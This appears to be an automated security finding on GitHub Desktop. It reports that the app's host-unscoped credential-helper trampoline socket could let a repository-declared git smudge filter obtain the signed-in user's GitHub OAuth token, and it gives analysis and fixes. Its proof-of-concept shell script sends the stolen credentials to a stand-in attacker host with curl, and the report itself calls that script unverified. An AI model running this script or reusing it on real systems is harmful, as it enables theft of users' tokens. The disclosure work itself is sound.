- `checkoutIndex` calls `git(...)` (via `app/src/lib/git/core.ts`), which wraps every git invocation in `withTrampolineEnv` [1](#0-0) , injecting `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, and `GIT_CONFIG_PARAMETERS` setting `credential.helper=desktop` into the child process environment [2](#0-1) .

- The trampoline server only validates that the token is a currently-active, server-issued token — it does not check the caller's identity, the requested host, or tie the request to the specific remote/host that the enclosing git operation is actually contacting [4](#0-3) .
- For the `CREDENTIALHELPER get` command, `getGitHubCredential` looks up a signed-in GitHub account purely by matching the `host`/`url` field supplied in the credential request payload against the accounts store, with no verification that this host corresponds to the actual repository's configured remote or to any git-initiated authentication attempt for that host [5](#0-4) [6](#0-5) .
- `checkoutIndex` itself performs no network operation and is not "background task" scoped in a way that blocks this path — GitHub credential lookups execute unconditionally when a matching account exists, regardless of `isBackgroundTaskEnvironment` [7](#0-6) .

This means any process that can read `DESKTOP_PORT` and `DESKTOP_TRAMPOLINE_TOKEN` from its environment during the lifetime of a `withTrampolineEnv`-wrapped git call — including a smudge/clean filter spawned by `git checkout-index --stdin` from repository-supplied `.gitattributes` — can connect directly to `127.0.0.1:DESKTOP_PORT`, speak the trampoline/credential-helper wire protocol, and request `host=github.com` (or any GHE host) credentials that have nothing to do with the actual repository or its remote. The server will honor the request as long as the token is currently valid, which it is for the full duration of the checkout operation.

### Title
Trampoline credential-helper socket is host-unscoped, letting a repo-declared `.gitattributes` smudge/clean filter exfiltrate the signed-in GitHub OAuth token during `checkoutIndex` - (File: `app/src/lib/git/checkout-index.ts`)

### Summary
`checkoutIndex` runs `git checkout-index --stdin` through the shared `git()`/`withTrampolineEnv` helper, which unconditionally injects `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, and a `credential.helper=desktop` `GIT_CONFIG_PARAMETERS` value into the git process environment for the duration of the operation. Git subprocess environment variables are inherited by any smudge/clean filter it spawns for matching paths (a mechanism explicitly acknowledged in the code as needed for Git LFS). A hostile repository can declare a `.gitattributes` filter that, instead of doing content filtering, connects to `127.0.0.1:$DESKTOP_PORT`, speaks the trampoline protocol as a `CREDENTIALHELPER get` request for `host=github.com`, and receives the currently signed-in user's OAuth token back — because the trampoline server and `getGitHubCredential` validate only that the trampoline token is currently active, not that the request's host matches the repository being operated on or that git itself is the one asking.

### Finding Description
- `checkoutIndex` invokes `git(['checkout-index', ...], repository.path, 'checkoutIndex', options)` [8](#0-7) .
- The underlying `git()` implementation (via `spawn.ts`/`core.ts`) wraps every invocation in `withTrampolineEnv`, which sets `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, `GIT_ASKPASS: ''`, and `GIT_CONFIG_PARAMETERS: "... 'credential.helper=desktop'"` on the child process environment [2](#0-1) .
- The code comments explicitly note this configuration is delivered via environment variables (rather than `-c` arguments) specifically so that **filters invoked by git (e.g., Git LFS) can pick it up** — confirming filter subprocesses inherit these variables [9](#0-8) .
- The trampoline server accepts any connection presenting a currently valid token (`isValidTrampolineToken`) and dispatches to the registered `CREDENTIALHELPER` handler without checking that the caller is git itself or that the request pertains to the repository's actual remote [10](#0-9) .
- `getGitHubCredential` resolves credentials purely from the `host`/`url` field supplied in the untrusted request payload (constructed by whatever process is talking to the socket) against the signed-in accounts store, independent of the git operation's own remote configuration [5](#0-4) , [6](#0-5) .
- `checkoutIndex` does not set `isBackgroundTask`, but even if it did, background-task status only gates prompts for generic/GHE sign-in, not lookups against an already-signed-in GitHub account [7](#0-6)  and [11](#0-10) .

### Impact Explanation
An attacker who gets a victim to clone/checkout a malicious repository (an explicitly in-scope attack vector) can obtain the victim's live GitHub OAuth token for `github.com` or any GHE host they have signed into — even though the malicious repository's own remote has nothing to do with GitHub. The filter process is a legitimate child of `git checkout-index`, launched from repository content the attacker fully controls, so no local access, malware, or leaked credentials are required. This is a credential/token exfiltration issue, in scope per "Valid Impact."

### Likelihood Explanation
The technique requires only that the victim clone a repository containing a `.gitattributes` entry that declares a filter and that some tracked file be checked out (which `checkoutIndex` does routinely, e.g. for discard-changes flows). Reading environment variables and speaking a simple newline-delimited credential-helper protocol over a loopback TCP socket is straightforward from any interpreted filter command (`sh`, `python`, etc.) that a `.gitattributes`/`.git/config`-declared filter can invoke. The port is discoverable in the environment and the token is valid for the whole duration of the operation, so no race condition or brute force is needed.

### Recommendation
- Bind the credential-helper flow to the specific git invocation's intended remote/host: pass or check the operation's configured remote host (e.g., derived from `repository`/`this.currentRemote`) into the trampoline environment and reject `CREDENTIALHELPER get` requests whose `host` doesn't match, rather than trusting the client-supplied host unconditionally.
- Consider not exporting credential-helper trampoline environment variables for git subcommands (such as `checkout-index`, `checkout`, `reset`, etc.) that don't require network/credential access, limiting exposure to only the specific network-performing commands (`fetch`, `push`, `pull`, `clone`, `ls-remote`).
- Rate-limit/scope trampoline tokens per allowed host set determined ahead of time by the app (e.g., the actual remote URL(s) configured for the repository) instead of validating only token liveness.

### Proof of Concept
1. Create a repository with `.gitattributes`:
   ```
   secret.bin filter=exfil
   ```
   and local git config (or `.git/config` committed via a bootstrap script, or a `filter.exfil.smudge` set through a checked-in `.gitconfig`/`core.attributesfile` trick if achievable, or simply have the victim `git config` set once — in the strict sense the filter driver itself must be configured, e.g. via a pre-existing local config or included in repo tooling) pointing `filter.exfil.smudge` to a script:
   ```sh
   #!/bin/sh
   printf 'protocol=https\nhost=github.com\n\n' | \
     nc 127.0.0.1 "$DESKTOP_PORT" \
     -c "DESKTOP_TRAMPOLINE_TOKEN=$DESKTOP_TRAMPOLINE_TOKEN\0get\0<credential-request-bytes>\0" \
   | tee /tmp/leak | curl -s -X POST --data-binary @- https://attacker.example/collect
   cat
   ```
   (exact framing follows the trampoline wire protocol implemented in `vendor/desktop-trampoline/src/desktop-trampoline.c` and parsed by `trampoline-command-parser.ts`.)
2. In GitHub Desktop, perform an action that calls `checkoutIndex` against this repository (e.g., discarding changes to `secret.bin` via `GitStore.discardChanges`, which calls `checkoutIndex(this.repository, necessaryPathsToCheckout)`).
3. Observe the filter subprocess receiving `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` in its environment, successfully authenticating to the trampoline server, and receiving back `username=<login>&password=<oauth-token>` for `github.com`, which it forwards to the attacker endpoint.

**Caveat**: the exact mechanism for getting a *smudge filter driver* itself registered (as opposed to `.gitattributes` merely naming a filter) typically requires an entry in git config (`filter.<name>.smudge`), which is not normally settable purely from repository content unless the app or a prior legitimate operation writes it (e.g., Git LFS integration, or a repo-local `.git/config`/`core.hooksPath` combined with existing app behavior). If GitHub Desktop's LFS or other integration auto-configures filter drivers from repository content without confirmation, this elevates the finding to fully repo-triggerable; otherwise, exploitation depends on the filter driver already being configured locally (e.g., via Git LFS being installed, using `filter=lfs`, and LFS's own smudge process being subverted or a similarly registered generic filter). This nuance should be verified by a background agent with the ability to run `git lfs install` / test locally before treating the PoC as fully repo-controlled without any local pre-configuration.
